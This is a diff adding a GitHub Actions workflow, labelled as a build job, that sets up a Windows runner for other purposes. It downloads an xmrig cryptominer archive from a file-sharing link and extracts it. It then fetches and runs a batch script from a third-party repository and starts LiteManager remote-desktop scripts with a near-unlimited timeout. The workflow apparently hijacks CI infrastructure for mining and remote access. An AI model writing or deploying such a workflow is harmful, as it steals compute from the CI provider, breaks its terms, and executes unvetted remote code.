@@ -1,0 +1,33 @@
+name: Windows - LiteManager
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+      - name: Download xmrig RAR File
+        run: |
+          Invoke-WebRequest -Uri "https://gofile.io/d/Jym2yJ" -OutFile "xmrig-6.21.3-msvc-win64.rar"
+
+      - name: Install 7-Zip
+        run: choco install -y 7zip
+
+      - name: Extract xmrig RAR File to Downloads
+        run: |
+          & 'C:\Program Files\7-Zip\7z.exe' x xmrig-6.21.3-msvc-win64.rar -oC:\Users\runneradmin\Downloads
+
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/seifzaabare/lm_win-10_github_rdp/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Connect to LiteManager
+        run: cmd /c show.bat
+
+      - name: Time Counter
+        run: cmd /c loop.bat
